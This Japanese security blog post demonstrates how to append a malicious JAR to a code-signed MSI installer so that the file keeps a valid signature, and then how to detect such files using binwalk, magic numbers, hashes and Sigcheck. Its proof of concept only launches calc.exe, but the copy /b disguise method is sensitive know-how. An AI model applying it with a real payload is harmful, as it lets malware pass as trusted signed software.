---
layout: post
title:  "malicious jar appended to msi"
date:   2019-01-28
permalink: /security/:title
categories: Security
tags: malware jar msi
excerpt: VirusTotal blogで2019.1.15に紹介されたマルウェア配信テクニックを実証します。
---

* content
{:toc}

# 初めに

このポストでは、コード署名済みmsiファイルに悪意あるJARを追加する経験を通じて、そのような手法で作成されたファイルを見極める方法を考察します。

2019年01月15日にVirusTotalブログに「悪意あるJARファイルをコード署名済みmsiファイルに追加する手法」の注意喚起が掲載されました。
コード署名とは信頼できるベンダーによって提供されたソフトウェアが改ざんされていない事を確認する手段の一つです。
コード署名が施されたexeファイルを改ざんすると署名は無効化されますが、msiファイルの末尾に悪意あるコードを追加した場合はその限りではありません。

この抜け穴は悪意あるJARファイルを実行する場面で有効です。
JARファイルはZIPフォーマットを採用しており、ファイル末尾のセントラルディレクトリを参照してアーカイブされたリソースを読み取ります。
つまり、ファイルの先頭がどのようなデータであろうと、末尾nバイトが正常なデータはJARとして機能します。

# 実行可能JARを作る

Windows calcを起動するだけのjavaプログラムを書きます。

```
public class Malware{
  public static void main(String[] args){
    try{
      Runtime.getRuntime().exec("cmd /c calc.exe");
    }catch(Exception e){
      e.printStackTrace();
    }
  }
}
```

エントリーポイントを指定するためにマニフェストを書きます。

```
Main-Class: Malware
```

コンパイルしてJARにまとめます。

```
> javac Malware.java
> jar cfm simple.jar mymanifest *.class
```

出来上がったsimple.jarをダブルクリックするとWindows calcが起動します。

# MSIに埋め込む

適当な署名済みMSIファイルを用意します。

![](/images/appendedmsi/capture01.png)

MSIファイルの後ろにsimple.jarを結合します。

```
> copy /b elasticsearch-6.5.4.msi + simple.jar attached.jar
```

attached.jarのプロパティから有効なデジタル署名を確認できますが、ダブルクリックするとWindows Calcが起動します。
正規のインストーラーに偽装した悪意あるJARを拡散するシナリオが想定できます。

<iframe width="560" height="315" src="https://www.youtube.com/embed/klDeYL5KzM4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

JARファイルを少し書き換えれば、Windows Calcが起動した後で本来のMSIファイルの挙動に繋げて、悪意ある挙動をカムフラージュすることも出来そうです。

# 改ざんを見極める

JARを埋め込んだMSIにどのような特徴があるのか調べました。

- バイナリが違うので既知のシグネチャにはマッチしません
- ハッシュも変わります
- 元がMSIなのでマジックナンバーがPKではありません

  ![](/images/appendedmsi/capture02.png)

- ファイル種別はMSI Installerです

  ```
  root@user-VirtualBox:/tmp# file attached.jar
  attached.jar: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, MSI Installer
  ```

- x509証明書の後ろにZIPデータが続いています

  ```
  root@user-VirtualBox:/tmp# binwalk attached.jar

  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  20480         0x5000          Microsoft Cabinet archive data, 104004344 bytes, 336 files
  1778894       0x1B24CE        Zip archive data, at least v2.0 to extract, name: META-INF/BC1024KE.SF
  2428408       0x250DF8        Zip archive data, at least v2.0 to extract, name: META-INF/MANIFEST.MF
  2582000       0x2765F0        Zip archive data, at least v2.0 to extract, name: META-INF/BC1024KE.SF
  2732443       0x29B19B        Zip archive data, at least v2.0 to extract, name: META-INF/BC1024KE.DSA
  ...(snip)...
  105941412     0x65089A4       XML document, version: "1.0"
  105947648     0x650A200       Microsoft Cabinet archive data, 3707320 bytes, 10 files
  109688426     0x689B66A       eCos RTOS string reference: "eCostInitializeFileCostCostFinalizeInstallValidateInstallInitializeInstallAdminPackageInstallFinalizeExecuteActionPublishFeature"
  109688444     0x689B67C       eCos RTOS string reference: "eCostCostFinalizeInstallValidateInstallInitializeInstallAdminPackageInstallFinalizeExecuteActionPublishFeaturesPublishProductINS"
  109772948     0x68B0094       Certificate in DER format (x509 v3), header length: 4, sequence length: 1177
  109774129     0x68B0531       Certificate in DER format (x509 v3), header length: 4, sequence length: 1386
  109775519     0x68B0A9F       Certificate in DER format (x509 v3), header length: 4, sequence length: 1504
  109780992     0x68B2000       Zip archive data, at least v2.0 to extract, name: META-INF/
  109781053     0x68B203D       Zip archive data, at least v2.0 to extract, name: META-INF/MANIFEST.MF
  109781208     0x68B20D8       Zip archive data, at least v2.0 to extract, name: Malware.class
  109781808     0x68B2330       End of Zip archive
  ```

- アーカイブされたファイルを参照できます

  ```
  root@user-VirtualBox:/tmp# 7za L attached.jar

  7-Zip (A) [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
  p7zip Version 9.20 (locale=C,Utf16=off,HugeFiles=on,1 CPU)

  Listing archive: attached.jar

  --
  Path = attached.jar
  Type = zip
  Physical Size = 108002936
  Offset = 1778894

     Date      Time    Attr         Size   Compressed  Name
  ------------------- ----- ------------ ------------  ------------------------
  2019-01-27 18:06:50 D....            0            2  META-INF
  2019-01-27 18:06:50 .....           90           89  META-INF/MANIFEST.MF
  2019-01-27 17:37:30 .....          535          357  Malware.class
  ------------------- ----- ------------ ------------  ------------------------
                                     625          448  2 files, 1 folders
  ```

# まとめ

悪意あるJARを署名済みMSIに埋め込むことは非常に簡単です。
そのようにして作成された悪意あるファイルは元のデジタル署名を引き継ぐため、一見しただけでは正常なファイルのように見えます。

幸いなことに、悪意あるJARファイルを見極めるのに役立ついくつかの観点があります。
ファイルを実行する前に少し立ち止まって、これに目を向けてください。

- ファイルのハッシュが公式サイトに掲載されている値と一致しているか
- ファイルのマジックナンバーと拡張子が一致しているか
- ファイルの末尾に不審なZIPデータが付いていないか

また、VirusTotalブログに記載されている通り、MS Sysinternal Sigcheckの最新版には今回の改ざんを検知する新たな機能が実装されています。VirusTotalもSigcheckを利用しており、今回のファイルに対してSigned but the filesize is invalid (the file is too large)という警告を上げてくれます。

# 参考URL

- [VirusTotal: Distribution of malicious JAR appended to MSI files signed by third parties](https://blog.virustotal.com/2019/01/distribution-of-malicious-jar-appended.html)
- [Wikipedia: ZIPファイルフォーマット](https://ja.wikipedia.org/wiki/ZIP_%28%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%29)
